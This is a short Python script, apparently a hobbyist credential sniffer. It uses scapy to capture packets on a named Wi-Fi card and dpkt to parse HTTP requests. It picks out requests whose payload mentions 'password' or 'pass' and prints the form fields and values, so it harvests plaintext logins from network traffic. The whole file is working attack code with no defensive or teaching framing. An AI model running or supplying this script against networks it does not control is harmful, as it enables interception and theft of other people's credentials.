import dpkt
from scapy.all import sniff, TCP, Raw

def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        try:
            payload = packet[Raw].load.decode('utf-8')
            if any(method in payload for method in ['GET', 'POST', 'HEAD', 'PUT', 'OPTIONS', 'CONNECT', 'TRACE']):
                if 'password' in payload.lower() or 'pass' in payload.lower():
                    httper(packet[Raw].load)
                    # print(payload)

        except UnicodeDecodeError:
            pass

def password_parser(pwd):
    data_dict = pwd.split("&")
    for param in data_dict:                                    
        key = param.split("=")[0]
        value = param.split("=")[1]
        print(f"{key}: {value}")

def httper(payload):
    try:
        request = dpkt.http.Request(payload)
        body = request.body.decode('utf-8')
        print("Body:",body)
        password_parser(body)

    except Exception:
        pass

interface = "MediaTek Wi-Fi 6 MT7921 Wireless LAN Card"
sniff(iface=interface, prn=packet_callback, store=False)
